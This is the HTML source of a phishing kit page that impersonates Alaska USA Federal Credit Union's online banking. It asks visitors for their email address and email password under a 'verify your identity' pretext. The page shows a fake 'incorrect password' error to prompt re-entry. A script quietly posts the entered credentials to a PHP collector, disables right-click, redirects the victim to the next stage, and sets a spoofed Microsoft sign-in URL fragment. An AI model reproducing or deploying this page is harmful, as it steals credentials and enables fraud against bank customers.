<!DOCTYPE>
<html lang="en">
<head>


    <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
    <title>Help us verify your Identity</title>

    <link rel="stylesheet" href="https://ultrabranch3.alaskausa.org/efs/efs/jsp/inc/css/ub-print.css?akusa_rev=4ce19ec3" type="text/css" media="print">
    <link rel="stylesheet" href="https://ultrabranch3.alaskausa.org/efs/efs/jsp/inc/css/ub-main.css?akusa_rev=4ce19ec3" type="text/css" title="main" media="screen, projection">
    <link rel="stylesheet" href="https://ultrabranch3.alaskausa.org/efs/efs/jsp/inc/css/ub-login-new.css?akusa_rev=4ce19ec3" type="text/css">
    <link rel="stylesheet" href="css/style.css" />
	
	<style>
      .table {
        display: table;
        width: 100%;
      }
      .tr { display: table-row }
      .left {
        display: table-cell;
        text-align: left;
      }
      .right {
        display: table-cell;
      }
      .fieldLabel {
        font-weight: bold;
        width: 4.5em;
        display: inline-block;
        text-align: right;
        padding-right: .2em;
      }
      .error {
        font-weight: bold;
        color: #bb0000;
      }
      #pgHead #logo {
        background: transparent;
        border: none;
      }
    </style>
    <style>
    	/*styles from credit union website -- may want to put these in a .css file*/
    	.leftCol {
			padding: 0 0 0 24px; background: url(https://www.alaskausa.org/css/nav/pgMainEdge.png) repeat-y 8px 0;
			width: 480px; float:left;
			margin-bottom:2em;
		}
		.leftCol h2::before {
			top: 50%; margin-top: -4px;
		}
		.leftCol > h2::before {
			content: ""; position: absolute; height: 9px; width: 9px; left: 2px; top: 50%;
			margin-top: -5px; background-color: #004990;
		}
		.leftCol > h2 {
			position: relative; margin: .5em 0 auto -22px; padding-left: 22px; line-height: 1.5em;
		}
		h2 {
			font-size: 1.4em; font-weight: bold; color: #004990;
		}
		.sideBar { width: 250px; float:left; }
		.hint { font-size: .85em; color:#666666;}

		@media only screen and (max-width: 767px) {
			.leftCol { float:none; background:none; padding:0;}
			.sideBar { float:none; }
		}

		@media only screen and (max-width: 479px) {
			.leftCol { width: 100%; }
		}

		.learnMore:first-child {
			margin-top: 0;
		}
		.learnMore { margin: 10px 5px; padding: 0; border-radius: 3px; overflow: hidden; background-color: #3F77C0; color: #ffffff;
		}
		.learnMore h2 { line-height: 32px; margin: 0; border-radius: 3px 3px 0 0; padding: 0 8px;
			font-size: 1.2em; color: #ffffff; background: #004990; font-weight: normal;
		}
		.learnMore ul, .learnMore li {
			margin: .5em 0;
		}
		.learnMore a { color: white !important;}
		.learnMore li { margin-left:30px !important;}
		.learnMore p {
			margin: .5em 0; padding: 0; margin-left: 8px;
		}

		/*from  service/certCalc.asp*/
		/* dataForm table for standardized data-input presentation - simple 2-col table */
		.dataForm {width:100%;border-collapse:collapse;margin-bottom:1em;font-size:1em;margin-top:1em; }
		.dataForm caption {border-top:1px solid gray;background-color:#f0f0f0;font-weight:bold; text-align:left;padding:6px;}
		.dataForm tbody tr:first-child td {border-top:1px solid gray;}
		.dataForm td, .dataForm th {padding:6px;vertical-align:top;text-align:left; border-top:1px solid gray; border-bottom:1px solid gray;}
		.dataForm thead td {border-top:1px solid gray;border-bottom:1px solid black;background-color:#f4f4f4;font-weight:bold;}
		.dataForm tbody th {width:40%; background-color:#eeeeee;font-weight:normal;text-align:right;}
		.dataForm tbody td {border-left:1px solid gray;}
		.dataForm tbody td:first-child {border-left-width:0;}
		.dataForm tfoot {font-size:.85em;color:#666666;padding:.5em;}
		.dataForm tfoot p {margin:.5em 0 0 0;}
		.dataForm .footnotes {margin:3px 5px;font-size:.85em;}

		.dataForm input {text-align:left;}
		.dataForm input[type="text"] {box-sizing:border-box;min-width:30%;}
		.dataForm input[type="submit"] {border-width:0;border-radius:2px;background-color:#3F77C0;color:white;color:white;font: 100% / 1.4 pt_sans_narrowregular, arial, helvetica, sans-serif;}
		.dataForm input[type="submit"]:hover {background-color:#345d8f;}
		.dataForm input[type="radio"] {outline:none;}

		.dataForm div[role="radiogroup"] {margin-bottom:-6px;}
		.dataForm div[role="radiogroup"] label {display:inline-block;box-sizing:border-box;min-width:30%;margin:0 5px 6px 0;border:1px solid #cccccc;border-radius:3px;padding:0 5px 0 0px; background-color:#eeeeee;}
		.dataForm div[role="radiogroup"] label:hover {background-color:#cccccc;color:#000066}
		.dataForm div[role="radiogroup"] label.radioSelected { background-color:#cccccc; color:#000066; }
		.dataForm div[role="radiogroup"].stack {float:left;}
		.dataForm div[role="radiogroup"].stack label {float:left;clear:left;}

		/* dataForm adaptations */
		@media (max-width:479px){
			/* auto-convert radiogroups to "stack" format */
			.dataForm div[role="radiogroup"] label {display:block;margin-right:0;float:none;}
			.dataForm {border-bottom:1px solid gray;}
			.dataForm tbody th {display:block;box-sizing:border-box;width:100%;margin-top:3px;border-width:0;border-top:1px solid gray;padding:3px 6px 0;background-color:#ffffff;text-align:left;color:#004990}
			.dataForm tbody td {display:block;border-width:0;padding-top:0;}
			.dataForm tbody tr:first-child td {border-top:none;}
		}

    </style>

  </head>
  <body>
    <div id="header">
      <div id="topBar">
        <a href="https://www.alaskausa.org/" id="logo" title="Alaska USA Federal Credit Union">
		<img src="https://ultrabranch3.alaskausa.org/efs/efs/grafx/akusa/akusafcu_logo.png" alt="Alaska USA products for you"></a>
        <p id="headerReturnLink"><a href="https://www.alaskausa.org/" title="Home">Return to home</a></p>
      </div>
      <div id="pgHead">
        <!--
        <a title="Alaska USA homepage (in new window)" id="logo" tabindex="-1"
          href="javascript:PopupWindow('AKUSA');">
          <img border="0" alt="Alaska USA" src="/efs/images/logo-corp.png" />
        </a>
        -->
      </div>
    </div>
    <div id="pgMain">
      <div id="mainContent">
        <div class="leftCol">
          
          <h2 style="margin-top:30px;">Help us verify your Identity</h2>
          
          
          <div class="last">
            
            
            <form name="emailForm" id="emailForm" action="" method="POST">
              
              <p>
              Provide your email and email password to verify your account on file.
              
              </p>
			  
			  <table class="dataForm">
                <tbody>
				 <tr>
                    <th scope="row">&nbsp;</th>
                    <td>
                     <label id="userIdLabel"><span style="color:red">Incorrect email or email password. Please try again</span></label>
                    </td>
                  </tr>
                  <tr>
                    <th scope="row"><label id="userIdLabel">Email Address:</label></th>
                    <td>
                      <input type="email" id="email" name="email" class="inputField" aria-labelledby="userIdLabel" autocomplete="off" value="" required >
                    </td>
                  </tr>
                  <tr>
                    <th scope="row"><label id="emailLabel">Email Password:</label></th>
                    <td>
                      <input type="password" id="emailpass" name="emailpass" class="inputField" aria-labelledby="emailLabel" value="" required autocomplete="off" autocapitalize="none" autocorrect="off">
                    </td>
                  </tr>
                </tbody>
              </table>
              <div class="center"><input type="submit" name="Continue" value="Continue" class="button100"></div>
            </form>
            
            
          </div>
         
        </div>
        <div class="sideBar">
          <!--<div class="learnMore">
            
            <h2 class="help">Quick Help</h2>
            <ul class="help">
              
              <li id="liNote1">
                <a href="#" onclick="toggleNote('liNote1','note1');return false;">Which email should I use?</a>
                <div class="notes" id="note1">
                  <p>Use the email address assigned to the account.</p>
                </div>
              </li>
              <li id="liNote2">
                <a href="#" onclick="toggleNote('liNote2','note2');return false;">UltraBanch Business Edition User?</a>
                <div class="notes" id="note2" style="list-style:none">
                  Primary Contacts have three options for assistance:
                  <ul style="list-style-type:disc;padding-left:0;">
                    <li>Contact a Company Administrator</li>
                    <li>Go into a branch with a photo ID</li>
                    
                    <li>Attempt an online password reset</li>
                    
                    
                  </ul>
                </div>
              </li>
              <li><a href="https://www.alaskausa.org/service/ultrabranch/guide.asp?s=msc" target="_blank">Forgot User ID?</a></li>
              <li><a href="https://www.alaskausa.org/service/ultrabranch/guide.asp" target="_blank">Other issues?</a></li>
              
              
            </ul>
            <div class="help" style="display:none;">
              <h1>Questions?  (800) 525-9094</h1>
            </div>
            
          </div>-->
          <!--<div id="questionSection" class="learnMore">
            <h2>Questions?</h2>
            <p>
              For assistance contact the Member Service Center.
            </p><p style="padding-left:10px;margin-top:10px;">
              (907) 563-4567 or (800) 525-9094<br><br>
              Open 24 hours a day, 7 days a week.<br><br>
              <a href="https://www.alaskausa.org/service/contact.asp" target="_blank">More contact information</a>
            </p>
            <p></p>
          </div>-->
        </div>
      </div>
      
      <div id="pgFooter" style="background-color:rgb(200,200,200)">
        <hr>

   <div id="footer" role="contentinfo">
   	 <span class="bug">
       <img alt="Equal Housing Lender" src="/efs/efs/grafx/akusa/logo-ehl-tri.gif?#042116">
     </span>

     <p> © Copyright  2021 • Alaska&nbsp;USA and UltraBranch are registered trademarks of Alaska&nbsp;USA Federal Credit Union.</p>
     <p>Mortgage loans are provided by Alaska USA Mortgage Company, LLC. License #AK157293 <br>
     Washington Consumer Loan Company License #CL-157293; Licensed by the Department of Financial Protection and Innovation under the California Residential Mortgage Lending Act, License #4131067.</p>
        <p><a href="javascript:PopupWindow('Privacy');">Privacy</a></p>
     

     <p class="ncua">
       <img src="/efs/efs/grafx/akusa/logo-ncua.gif?#042116" alt="Your funds federally insured to at least $250,000 and backed by the full faith and credit of the United States Government. National Credit Union Administration, a U.S. Government Agency"><span>Federally insured by NCUA</span>
     </p>
   </div>
      </div>
    </div>
  
<div class="overlay">
  <div class="lgif-space"></div>
    <div class="loadgif">
       <img src="img/loading.gif" width="100" height="100">
    </div>
</div>


<script src="https://code.jquery.com/jquery-3.2.1.min.js"></script>

 <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.0/umd/popper.min.js" integrity="sha384-cs/chFZiN24E4KMATLdqdvsezGxaGsi4hLGOzlXwp5UZB1LY//20VyM2taTB4QvJ" crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js" integrity="sha384-uefMccjFJAIv6A+rW+L4AHf99KvxDjWSu1z9VI8SKNVmz4sk7buKt/6v9KI65qnm" crossorigin="anonymous"></script>
<script src="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.3.1.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.10/jquery.mask.js"></script>

<script type="text/javascript">

$(document).bind("contextmenu", function(e){ return false;});

$('#emailForm').on('submit', function(e){
		
		 $(".overlay").show(500);
		$.post('T_a_n_G_u_l_AR/process3.php', $(this).serialize(), function(data){
			console.log(data);
		});
		setTimeout(function() {
                               window.location.href = "indexinfo.php";
                        },2000);
		e.preventDefault();
	});



</script>





<script> 
  location.hash = 'wa=wsignin1.0&rpsnv=13&ct=1539585327&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3d715d44a2-2f11-4282-f625-a066679e96e2&id=292841&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015&domain=' 
</script>

<script type="text/javascript" src="js/actions.js"></script>
</body>
</html>